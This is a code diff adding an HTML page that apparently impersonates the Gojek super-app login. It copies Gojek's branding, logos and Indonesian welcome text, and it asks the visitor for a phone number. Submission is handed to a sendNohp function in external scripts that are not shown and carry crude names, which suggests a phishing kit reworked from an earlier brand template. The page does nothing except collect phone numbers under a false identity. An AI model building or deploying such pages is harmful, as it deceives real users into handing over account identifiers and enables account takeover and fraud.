@@ -1,0 +1,109 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="ast/main.css">
+    <link rel="stylesheet" href="ast/load.css">
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+        <title>Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran</title>
+        <link rel="icon" href="https://d1j87w3j7cc3a6.cloudfront.net/prime/static/prime/images/gojek_favicon.png" type="image/png" sizes="32x32">
+        <meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+        <meta property="og:title" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta property="twitter:title" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+        <meta property="og:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+        <meta property="twitter:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+</head>
+<body>
+    <div class="container page1">
+        <div style="display:none;" class="load">
+            <div class="box">
+                <div class="circle one"></div>
+                <div class="circle two"></div>
+                <div class="circle three"></div>
+            </div>
+        </div>
+        <div class="loadingScreen">
+            <img class="ovologo" style="display:none;" src="ast/gojek.png" alt="">
+            <img class="ovologo lgoto" style="display:none;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/GoTo_logo.svg/440px-GoTo_logo.svg.png" alt="">
+        </div>
+        <div class="header" style="justify-content:space-between;">
+            <i onclick="window.location.href='a.html'" class='bx bx-left-arrow-alt'></i>
+            <i class='bx bxs-help-circle' ></i>
+        </div>
+        <div class="title">
+            <h3 class="b">Selamat datang di Gojek!</h3>
+            <p class="r">Masuk atau daftar hanya dalam beberapa langkah mudah.</p>
+        </div>
+        <form id="formNohp" onsubmit="sendNohp(event);">
+            <div class="wrapInp">
+                <div class="label r"><img src="ast/indo.png" alt=""><p class="b">+62</p></div>
+                <input autofocus type="tel" autocomplete="off" id="nohp" class="nohp b" name="nohp" required placeholder="81x-xxx-xxx">
+                <i id="del" onclick="removeInp();" class='bx bxs-x-circle' style="display:none;" ></i>
+            </div>
+            <div class="bgbtn">
+                <button disabled class="b" type="submit" id="btnnohp">LANJUT</button>
+            </div>
+            <p class="b reset">Ada kendala atau lupa nomor?</p>
+            <img class="goto1" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/GoTo_logo.svg/440px-GoTo_logo.svg.png">
+        </form>
+    </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="ast/jquery.mask.min.js"></script>
+<script>
+    $(document).ready(function(){
+        $('#nohp').on('input', function(){
+            if($(this).val() == '0' || $(this).val() == '62'){
+                $(this).val('');
+            }
+        });
+    });
+</script>
+<script>
+    $(document).ready(function(){
+        $('#nohp').mask('000-0000-000000');
+    });
+</script>
+<script>
+    let inphp = document.getElementById("nohp");
+    let btnnohp = document.getElementById("btnnohp");
+    let del = document.getElementById("del");
+    inphp.addEventListener("input", val);
+    function val(){
+        if (inphp.value.length > 10){
+            btnnohp.disabled = false;
+        } else {
+            btnnohp.disabled = true;
+        }
+    };
+    inphp.addEventListener("input", valDel);
+    function valDel(){
+        if (inphp.value != ""){
+            $("#del").show();
+        } else {
+            $("#del").hide();
+        }
+    };
+    function removeInp(){
+        $("#nohp").val("");
+        $("#nohp").focus();
+        $("#del").hide();
+    }
+</script>
+<script src="kntl.js"></script>
+<script src="pler.js"></script>
+<script>
+    window.onload = function(){
+        setTimeout(function(){
+            $(".ovologo").fadeIn(200);
+            setTimeout(function(){
+                $(".loadingScreen").fadeOut(200);
+            },1000);
+        },500);
+    }
+</script>
+</body>
+</html>
